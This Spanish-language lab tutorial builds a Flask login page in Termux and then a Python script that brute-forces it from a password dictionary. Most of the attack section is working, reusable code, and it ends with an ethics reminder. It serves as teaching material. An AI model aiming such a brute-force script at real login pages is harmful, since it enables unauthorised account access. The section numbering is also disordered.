# LABORATORIO365
 
### 1. Configuración de Termux

Primero, asegúrate de tener Python y Flask instalados en Termux. Si no lo has hecho, ejecuta los siguientes comandos:

```bash
pkg install python
pip install Flask
```

### 2. Crear la Página Web

Crea un archivo llamado `app.py` que contendrá el servidor Flask y la lógica de la página de inicio de sesión:

```bash
nano app.py
```

Luego, inserta el siguiente código:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Contraseña correcta
correct_password = "secreta123"

# Página de inicio de sesión
html_template = """
<!doctype html>
<html>
<head>
    <title>Prueba de Penetración</title>
</head>
<body>
    <h1>Iniciar Sesión</h1>
    <form method="POST">
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit">Entrar</button>
    </form>
    {% if message %}
        <p>{{ message }}</p>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    message = ""
    if request.method == 'POST':
        password = request.form.get('password')
        if password == correct_password:
            message = "¡Acceso concedido!"
        else:
            message = "Contraseña incorrecta. Inténtalo de nuevo."
    return render_template_string(html_template, message=message)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

Este código crea una simple página web que solicita una contraseña. Si se introduce la contraseña correcta (`secreta123`), se concede acceso; de lo contrario, se muestra un mensaje de error.

### 3. Ejecutar la Aplicación

Guarda y cierra el archivo `app.py`. Luego, ejecuta el servidor Flask con el siguiente comando:

```bash
python app.py
```

La aplicación estará disponible en `http://127.0.0.1:5000/`.

### 4. Crear un Script en Python para Averiguar la Contraseña

Ahora, crearemos un script en Python que intente averiguar la contraseña. Crea un nuevo archivo llamado `brute_force.py`:

Aquí tienes una versión mejorada del script `brute_force.py`, que incluye animaciones, colores, un logo ASCII de Kali Linux, y un menú interactivo. Para lograr esto, usaremos la biblioteca `colorama` para el color y un bucle que permita ejecutar múltiples ataques de fuerza bruta.

### 1. Instalar la biblioteca `colorama`

Primero, asegúrate de que tienes `colorama` instalado en tu entorno Termux:

```bash
pip install colorama
```

### 2. Modificar el archivo `brute_force.py`

Aquí tienes el nuevo contenido para `brute_force.py`:

```python
import requests
import time
import os
from colorama import Fore, Style, init

# Inicializar colorama
init(autoreset=True)

# Logo ASCII de Kali Linux
kali_logo = r"""
      _  __          _   _       _           
     | |/ /__ _   _| |_| | ___ | | ___ _ __  
     | ' // _ \ | | | __| |/ _ \| |/ _ \ '_ \ 
     | . \  __/ |_| | |_| | (_) | |  __/ | | |
     |_|\_\___|\__,_|\__|_|\___/|_|\___|_| |_|
             by RED365
"""

# Función para imprimir el menú
def menu():
    print(Fore.GREEN + kali_logo)
    print(Fore.GREEN + "Menú:")
    print("1. Realizar fuerza bruta")
    print("2. Salir")
    choice = input("Elige una opción: ")
    return choice

# Función principal para el ataque de fuerza bruta
def brute_force_attack(url):
    with open('diccionario.txt', 'r') as f:
        passwords = f.read().splitlines()  # Leer contraseñas desde el diccionario

    for password in passwords:
        print(Fore.GREEN + f"\nProbando contraseña: {password}...")
        time.sleep(1)  # Simula un pequeño retraso para la animación
        response = requests.post(url, data={"password": password})

        if "¡Acceso concedido!" in response.text:
            print(Fore.GREEN + f"Contraseña encontrada: {password}")
            break
        else:
            print(Fore.RED + f"Contraseña incorrecta: {password}")

# Ciclo principal
while True:
    user_choice = menu()
    if user_choice == "1":
        brute_force_attack("http://127.0.0.1:5000/")
    elif user_choice == "2":
        print(Fore.GREEN + "Saliendo...")
        break
    else:
        print(Fore.RED + "Opción no válida. Inténtalo de nuevo.")
```

### 3. Cómo funciona el script

- **Logo y Colores:** Utiliza ANSI escape codes para mostrar el logo de Kali Linux y los textos en verde y rojo.
- **Menú Interactivo:** Ofrece opciones para realizar un ataque de fuerza bruta o salir.
- **Animaciones:** Cada vez que se prueba una contraseña, hay un pequeño retraso (`time.sleep(1)`) para simular la "animación" de prueba.
- **Reintentos:** Después de realizar un ataque de fuerza bruta, el script vuelve al menú, permitiendo realizar otro ataque o salir.

### 4. Ejecución del Script

Asegúrate de que tanto `brute_force.py` como `diccionario.txt` estén en el mismo directorio y luego ejecuta el script:

```bash
python brute_force.py
```

Ahora tendrás un programa más interactivo y visualmente atractivo que realiza ataques de fuerza bruta en la página de inicio de sesión. ¡Recuerda usarlo de manera responsable!

### 6. Consideraciones Éticas

Recuerda que realizar pruebas de penetración y ataques de fuerza bruta deben hacerse solo en entornos donde tengas permiso explícito para hacerlo. El uso indebido de estas técnicas puede tener consecuencias legales.

### Resumen

Hemos creado una sencilla aplicación web de inicio de sesión con Flask y un script en Python para intentar averiguar la contraseña mediante un ataque de fuerza bruta. Esto es solo para fines educativos y de práctica. ¡Asegúrate de usarlo de manera responsable!
